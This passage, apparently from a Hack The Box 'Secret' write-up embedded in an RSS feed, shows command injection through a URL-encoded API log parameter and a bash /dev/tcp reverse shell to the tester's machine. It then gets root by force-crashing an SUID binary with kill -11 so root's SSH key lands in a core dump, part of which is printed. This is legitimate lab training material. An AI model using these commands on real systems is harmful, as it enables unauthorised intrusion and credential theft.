+</span></span><span class="line"><span class="cl">$ curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|uname%20-a&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;Linux secret 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n&#34;</span>
+</span></span></code></pre></div><p>And that worked.</p>
+<blockquote>
+<p>the <code>&gt;</code> and <code>/</code> symbols are URL encoded.</p>
+</blockquote>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>This time I&rsquo;ll setup a netcat listener and send URL-encoded bash reverse shell and</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.28%2F88%200%3E%261%22&#34;</span>
+</span></span></code></pre></div><p>On my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">88</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.28<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.120<span class="o">]</span> <span class="m">46050</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>2131<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span>
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$
+</span></span></code></pre></div><p>I&rsquo;ll upgrade my shell so it can be more interactive</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:~/local-web$ script /dev/null -c bash
+</span></span><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">Script started, file is /dev/null
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ ^Z
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7417</span> suspended  nc -nvlp <span class="m">88</span>
+</span></span><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7417</span> continued  nc -nvlp <span class="m">88</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$
+</span></span></code></pre></div><p>The user flag is done here.</p>
+<pre tabindex="0"><code>dasith@secret:~$ cat user.txt
+c95a3f...[SNIP]...
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Doing a recursive search with the <code>find</code> command reveal a crash file</p>
+<pre tabindex="0"><code>dasith@secret:/opt$ find / -type f -user dasith 2&gt;/dev/null | grep -v &#39;proc\|\.npm\|local-web&#39;
+/var/crash/_opt_count.1000.crash
+...[SNIP]...
+</code></pre><p>That naming lead me to <code>/opt</code>, where I find a C code, a binary, and a log file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/$ ls /opt/
+</span></span><span class="line"><span class="cl">code.c  count  valgrind.log
+</span></span><span class="line"><span class="cl">dasith@secret:/$ <span class="nb">cd</span> /opt/
+</span></span><span class="line"><span class="cl">dasith@secret:/opt$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">56</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Oct  <span class="m">7</span> 10:06 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">20</span> root root  <span class="m">4096</span> Oct  <span class="m">7</span> 15:01 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">3736</span> Oct  <span class="m">7</span> 10:01 code.c
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">16384</span> Oct  <span class="m">7</span> 10:01 .code.c.swp
+</span></span><span class="line"><span class="cl">-rwsr-xr-x  <span class="m">1</span> root root <span class="m">17824</span> Oct  <span class="m">7</span> 10:03 count
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">4622</span> Oct  <span class="m">7</span> 10:04 valgrind.log
+</span></span></code></pre></div><p>The binary drews my attention because it has SUID bit.</p>
+<p>When I run it, it asks for a file/directory and when it finishes, I&rsquo;m given with an option to save the results.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ ./count
+</span></span><span class="line"><span class="cl">Enter <span class="nb">source</span> file/directory name: /root/root.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">33</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl">Save results a file? <span class="o">[</span>y/N<span class="o">]</span>: y
+</span></span><span class="line"><span class="cl">Path: /tmp/test
+</span></span><span class="line"><span class="cl">dasith@secret:/opt$ cat /tmp/test
+</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">33</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">2</span>
+</span></span></code></pre></div><p>From here, I&rsquo;ll look into the C code.</p>
+<h4 id="source-code-analysis-1">Source Code Analysis</h4>
+<p>Since the rests isn&rsquo;t that important, I&rsquo;ll start from the main function</p>
+<p>In the code snippet below, the first thing that this program do is ask the user for input and then it decides which functions to call: <code>dircount</code> if the input is a directory and <code>filecount</code> if the input is a file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">stat</span> <span class="n">path_s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">summary</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter source file/directory name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%99s&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">stat</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">path_s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">S_ISDIR</span><span class="p">(</span><span class="n">path_s</span><span class="p">.</span><span class="n">st_mode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dircount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filecount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+</span></span></code></pre></div><p>The next thing this program do is dropping the root privilege to normal user, and then it&rsquo;s forced to generate a <a href="https://en.wikipedia.org/wiki/Core_dump">core dump</a>. Lastly, it&rsquo;ll ask whether the user wants to save the result or not.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// drop privs to limit file write
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">setuid</span><span class="p">(</span><span class="n">getuid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Enable coredump generation
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Save results a file? [y/N]: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">121</span> <span class="o">||</span> <span class="n">res</span> <span class="o">==</span> <span class="mi">89</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Path: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%99s&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&#34;a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fputs</span><span class="p">(</span><span class="n">summary</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Could not open %s for writing</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The key here is that, with core dump enabled (<code> prctl(PR_SET_DUMPABLE, 1)</code>), the memory state of this program will be recorded and dumped to crash file in case the program crashes. That file is typically used for diagnosing the program fault.</p>
+<h4 id="abuse-core-dump---force-crash">Abuse Core Dump - Force Crash</h4>
+<p>When I open a file like <code>/root/.ssh/id_rsa</code> in this program and if by accident it crashes, the content of that <code>id_rsa</code> will definitely got dumped into the crash file.</p>
+<p>Now the question is, how do I <em>crash</em> this program? According to <a href="https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd">this post</a> on StackOverFlow, sending <code>kill -11</code> can trigger a crash, which eventually produce a core dump of the crashed app.</p>
+<p>First, I will open another sessions, so I have two in total. On the first session, I&rsquo;ll run the <code>count</code> program  and keep it running in the result section.</p>
+<pre tabindex="0"><code>dasith@secret:/tmp/$ /opt/count
+Enter source file/directory name: /root/.ssh/id_rsa
+
+Total characters = 2602
+Total words      = 45
+Total lines      = 39
+Save results a file? [y/N]: y
+Path: 
+</code></pre><p>Then on the other session, you guess it, I will send a kill signal to crash the app.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ <span class="nb">kill</span> -11 <span class="k">$(</span>pidof count<span class="k">)</span>
+</span></span></code></pre></div><p>It crashed</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Enter <span class="nb">source</span> file/directory name: /root/.ssh/id_rsa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">2602</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">45</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">39</span>
+</span></span><span class="line"><span class="cl">Save results a file? <span class="o">[</span>y/N<span class="o">]</span>: y
+</span></span><span class="line"><span class="cl">Path: Killed
+</span></span></code></pre></div><p>The crash file is generated under <code>/var/crash/</code></p>
+<pre tabindex="0"><code>dasith@secret:/tmp$ ls -l /var/crash/_opt_count.1000.crash
+-rw-r----- 1 dasith dasith 28717 Oct 31 08:39 /var/crash/_opt_count.1000.crash
+</code></pre><p>According to <a href="https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash">this post</a>, the crash file can be unpacked into a separate files using the <code> apport-unpack</code> utility, which also installed in this machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/tmp/$ mkdir .syncrst <span class="o">&amp;&amp;</span> apport-unpack /var/crash/_opt_count.1000.crash .syncrst
+</span></span><span class="line"><span class="cl">dasith@secret:/tmp/$ ls -la .syncrst
+</span></span><span class="line"><span class="cl">total <span class="m">440</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> dasith dasith   <span class="m">4096</span> Oct <span class="m">31</span> 08:43 .
+</span></span><span class="line"><span class="cl">drwxrwxrwt <span class="m">16</span> root   root     <span class="m">4096</span> Oct <span class="m">31</span> 08:25 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">5</span> Oct <span class="m">31</span> 08:43 Architecture
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith <span class="m">380928</span> Oct <span class="m">31</span> 08:43 CoreDump
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">1</span> Oct <span class="m">31</span> 08:43 CrashCounter
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">24</span> Oct <span class="m">31</span> 08:43 Date
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">12</span> Oct <span class="m">31</span> 08:43 DistroRelease
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ExecutablePath
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ExecutableTimestamp
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">5</span> Oct <span class="m">31</span> 08:43 ProblemType
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ProcCmdline
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ProcCwd
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">64</span> Oct <span class="m">31</span> 08:43 ProcEnviron
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith   <span class="m">2144</span> Oct <span class="m">31</span> 08:43 ProcMaps
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith   <span class="m">1343</span> Oct <span class="m">31</span> 08:43 ProcStatus
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">2</span> Oct <span class="m">31</span> 08:43 Signal
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">29</span> Oct <span class="m">31</span> 08:43 Uname
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">3</span> Oct <span class="m">31</span> 08:43 UserGroups
+</span></span></code></pre></div><p>The CoreDump file is the one that contains the <code>id_rsa</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/tmp/$ cat .syncrst/CoreDump
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">□☺□$□□□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□wȏ♥□□□xWU□□□□□□□□□□□xWU□□□□□□wȏ<span class="sb">`</span>□wȏ◄►-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class="line"><span class="cl">NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
+</span></span><span class="line"><span class="cl">KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9
+</span></span><span class="line"><span class="cl">6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl
+</span></span><span class="line"><span class="cl">xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k
+</span></span><span class="line"><span class="cl"><span class="nv">fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div><p>Now I can login as root and grab the root flag with that key!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ ssh -i coredump.ssh root@10.10.11.120
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.11.120 (10.10.11.120)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:YNT38/psf6LrGXZJZYJVglUOKXjstxzWK5JJU7zzp3g.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.11.120<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-89-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Sun <span class="m">31</span> Oct <span class="m">2021</span> 08:16:22 AM UTC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">223</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   52.8% of 8.79GB   Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 20%               IPv4 address <span class="k">for</span> eth0: 10.10.11.120
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Sun Oct <span class="m">31</span> 07:47:50 <span class="m">2021</span> from 10.10.14.91
+</span></span><span class="line"><span class="cl">root@secret:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@secret:~# cat root.txt
+</span></span><span class="line"><span class="cl">d1d6d....<span class="o">[</span>SNIP<span class="o">]</span>....
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
